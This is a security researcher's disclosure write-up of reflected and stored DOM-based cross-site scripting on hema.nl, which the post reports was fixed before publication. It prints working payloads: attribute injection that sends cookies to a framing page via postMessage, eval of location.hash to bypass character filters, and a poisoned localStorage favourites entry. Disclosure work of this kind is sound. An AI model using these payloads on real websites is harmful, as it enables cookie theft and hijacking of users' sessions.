---
layout: post
title: Cross-site-scripting on one of the largest Dutch franchisors
subtitle: Reflected and "Stored" DOM-based cross-site-scripting on hema[dot]nl.
description: By abusing a sensitive data exposure vulnerability it is possible to steal data from a Hema user. If the user is signed in, data like the user's name and email can be stolen using cross frame scripting. Besides that, a malicious JavaScript payload can be inserted into the local storage which causes DOM-based XSS.
keywords: xss, cross-site, scripting, hema, dutch, franchisor, dom, dom-based, sensitive, data, exposure
include_in_header: false
include_in_footer: false
show_in_post_list: false
robots: index, follow
---

By abusing a sensitive data exposure [vulnerability](https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure){:target="_blank"}{:rel="noopener noreferrer"} it is possible to steal data from a Hema user. If the user is signed in, data like the user's name and email can be stolen using [cross frame scripting](https://www.owasp.org/index.php/Cross_Frame_Scripting){:target="_blank"}{:rel="noopener noreferrer"}. Besides that, a malicious JavaScript payload can be inserted into the local storage which causes DOM-based XSS.

> Please note that I used FireFox to test this vulnerability since browsers like Chrome, Safari and Edge have built in XSS auditors, which filter some of the reflected XSS.

{% 
    include lightbox.html 
    image="/img/xss-on-hema-one-of-the-largest-dutch-franchisors/xss-auditor-block.png"
    title="Google Chrome's XSS auditor"
    album="xss-auditor-block"
    width="364"
    height="52"
%}

### Proof of Concept (reflected XSS)
While examining hema.nl I found some interesting XHR calls. One of them was `ListerQuickView.aspx`, which contained a lot of GET parameters.

`http://www.hema.nl/Pages/Fredhopper/ListerQuickView.aspx?culture=nl-NL&nextProductId=pnl_60000199&prevProductId=&productId=pnl_60000198&productSku=12345`

I tried to inject JavaScript in all the parameters but it didn't really work. Especially because they blocked all requests if the URL contained a `<` sign followed by another character. The value of one of the parameters, `productSku`, was used as an attribute value. This made it possible to execute JavaScript using the `onmousemove` event. Unfortunately the `onload` event couldn't be used since the element it got injected in was a div.

You can find the payload I used below. The inline CSS causes the div to overlap all content (this increases the chance that `onmousemove` is triggered). The `parent.postMessage` passes the cookie to the parent frame on mouse move.

`&productSku=tes" style="width:100%;height:100%;position:absolute;top:0;left:0;" onmousemove="parent.postMessage(cookie, '*')">as`

Which resulted in the following HTML:

{% 
    include lightbox.html 
    image="/img/xss-on-hema-one-of-the-largest-dutch-franchisors/xss-payload-in-source.jpg"
    title="Payload in HTML"
    album="image-xss-payload"
    width="1937"
    height="174"
%}

We can now place this piece of art in an iframe, which results in cross frame scripting.

### Proof of Concept (Stored DOM-based XSS)

Making it "Stored DOM-based XSS" is a bit more difficult. I divided it into two steps, bypassing the input restrictions and inserting the JavaScript payload into the local storage.

#### Bypassing Hema's input restrictions

The DOM-based XSS vulnerability contains a little bit more code. Lets use the previous payload and edit it to look like this:

`data-message="message" style="width:100%;height:100%;position:absolute;top:0;left:0;" onmousemove="eval(location.hash.substring(1))"`

This code executes the JavaScript from the `location.hash`. I used `location.hash` since hema.nl blocks a lot of characters, like `<` and `{`, and the `location.hash` will not be included in the request, so hema.nl will never know about it.

In my location hash I wrote `#window.addEventListener(arguments[0].originalTarget.attributes[4].value,function(event){eval(event.data)})`.

I use `arguments[0].originalTarget.attributes[4].value` (where `arguments[0]` is the `onmousemove` event) to get the value of the fourth attribute of our div, which is the string `message`. I couldn't just add the string `"message"` to `addEventListener` since quotes in the hash are converted to `%22`, which results in an unexpected `%` character.

So all this code basically sets a listener for messages on mouse move. Using cross frame scripting we can now execute all the code we want in the hema.nl iframe using `postMessage`.

`document.getElementById('hema').contentWindow.postMessage('alert(document.cookie)', '*')`

Which results in:

{% 
    include lightbox.html 
    image="/img/xss-on-hema-one-of-the-largest-dutch-franchisors/xss-alert-cookie.png"
    title="Alert on mouse over"
    album="image-alert-cookie"
    width="1166"
    height="181"
%}

This is the full URL that I used:

`http://www.hema.nl/Pages/Fredhopper/ListerQuickView.aspx?culture=nl-NL&nextProductId=pnl_60000199&prevProductId=&productId=pnl_60000198&productSku=tes%22%20data-message=%22message%22%20style=%22width:100%;height:100%;position:absolute;top:0;left:0;%22%20onmousemove=%22eval(location.hash.substring(1))%22%20data-test=%22as#window.addEventListener(arguments[0].originalTarget.attributes[4].value,function(event){eval(event.data)});`

#### Making it "Stored DOM-based XSS"

Hema stores some interesting JSON in the local storage. For example, they store all the products that I added to my favorites.

A product that I added to my favorites looks like this:

{% highlight json %}
{
        "imgUrl":"https://images.hema.nl/products/mok-60000198-normal.jpg",
        "imgUrlX2":"https://images.hema.nl/products/mok-60000198-normal_twox.jpg",
        "name":"mok",
        "productId":"pnl_60000198",
        "price":"3,-",
}
{% endhighlight %}

And ofcourse, using our postMessage, we can edit it so it looks like this (note the `onload` in the imgUrl):

{% highlight json %}
{
        "imgUrl":"https://images.hema.nl/products/mok-60000198-normal.jpg\" onload=\"alert(document.cookie)",
        "imgUrlX2":"https://images.hema.nl/products/mok-60000198-normal_twox.jpg",
        "name":"mok",
        "productId":"pnl_60000198",
        "price":"3,-",
}
{% endhighlight %}

Hema loads the favorites and shows the image without encoding the URL. Which means every time the victim navigates to hema.nl an alert will pop up.

So there you go, Stored DOM-based XSS!

{% 
    include lightbox.html 
    image="/img/xss-on-hema-one-of-the-largest-dutch-franchisors/xss-stored-proof.png"
    title="Stored DOM-based XSS in hema.nl"
    album="image-stored-dom-based-xss-alert-cookie"
    width="456"
    height="414"
%}

### Domains
<a href="http://www.hema.nl/" target="_blank" rel="noopener">www.hema.nl</a> (vulnerable)
<br>
<a href="http://www.hema.fr/" target="_blank" rel="noopener"><s>www.hema.fr</s></a> (protected by CloudFlare)
<br>
<a href="http://www.hema.be/" target="_blank" rel="noopener"><s>www.hema.be</s></a> (not vulnerable)
<br>
<a href="http://www.hemashop.com/" target="_blank" rel="noopener"><s>www.hemashop.com</s></a> (not vulnerable)

### Timeline
<div class="table-responsive">
    <table class="table">
        <thead>
            <tr>
                <th>Date</th>
                <th>Activity</th>
            </tr>
        </thead>
        <tbody>
            <tr>
                <td>11 Dec 2016 18:43:34 GMT</td>
                <td>Reported the vulnerability to Hema.</td>
            </tr>
            <tr>
                <td>12 Dec 2016 09:23:21 GMT</td>
                <td>Hema is investigating the vulnerability.</td>
            </tr>
            <tr>
                <td>15 Dec 2016 13:54:56 GMT</td>
                <td>Hema confirmed the vulnerability.<br>Hema will be releasing a fix in week 51.</td>
            </tr>
            <tr>
                <td>20 Dec 2016 19:11:44 GMT</td>
                <td>Hema fixed the vulnerability.</td>
            </tr>
            <tr>
                <td>20 Dec 2016 19:14:41 GMT</td>
                <td>Public disclosure.</td>
            </tr>
        </tbody>
    </table>
</div>
